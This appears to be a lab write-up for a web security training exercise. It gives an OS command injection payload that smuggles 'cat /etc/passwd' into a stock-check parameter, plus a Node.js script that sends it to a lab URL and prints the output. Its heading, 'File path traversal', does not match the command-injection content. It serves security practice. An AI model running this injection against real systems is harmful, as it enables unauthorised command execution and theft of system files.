# 1 - File path traversal, simple case

### Notes

The product stock check feature passed improperly sanitized data to an operating system command.

```http
POST /product/stock HTTP/1.1

productId=1%26cat+/etc/passwd%26%23&storeId=1
```

### Scripted Solution

```javascript
const axios = require('axios').default
require('dotenv').config({ path: './.env' })

/**
 * Run exploit.
 */
async function main() {
  const labUrl = process.env.LAB_URL

  const command = 'cat /etc/passwd'

  console.log(`Executing ${command}...`)
  const res = await axios.post(
    `${labUrl}/product/stock`,
    // Command something like: 'stockChecker.pl 123 &<command>&#456'
    `productId=123%26${command}%26%23&storeId=456`
  )
  console.log(res.data)
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
```
